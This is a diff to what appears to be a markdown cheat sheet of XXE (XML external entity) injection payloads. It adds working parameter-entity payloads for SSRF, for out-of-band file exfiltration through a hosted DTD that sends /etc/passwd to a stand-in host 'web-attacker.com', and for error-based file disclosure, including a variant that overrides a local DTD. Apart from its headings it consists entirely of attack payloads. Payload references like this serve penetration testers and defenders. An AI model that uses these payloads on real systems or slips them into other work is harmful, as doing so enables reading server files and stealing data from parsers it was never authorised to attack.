@@ -6,7 +6,7 @@
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://<path>"> ]>
 
 <field>&xxe;</field>
 ```
@@ -121,3 +121,69 @@ Text will appear within the image
     <text font-size="12" x="0" y="16">&xxe;</text>
 </svg>
 ```
+
+## Parametric payloads
+
+### SSRF
+
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<url>"> %xxe; ]>
+```
+
+### File exfiltration
+
+Hosted DTD
+
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+Actual payload
+
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http:<url to dtd file>"> %xxe;]>
+```
+
+### Error based file exfiltration
+
+Hosted DTD
+
+```
+<!ENTITY % file SYSTEM "file://<file>">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+### Error based with DTD override
+
+Test if DTD exists on target
+
+```
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file://<local dtd>">
+%local_dtd;
+]>
+```
+
+Payload
+
+```
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file://<path to local dtd>">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file://<target file>">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+
+
+
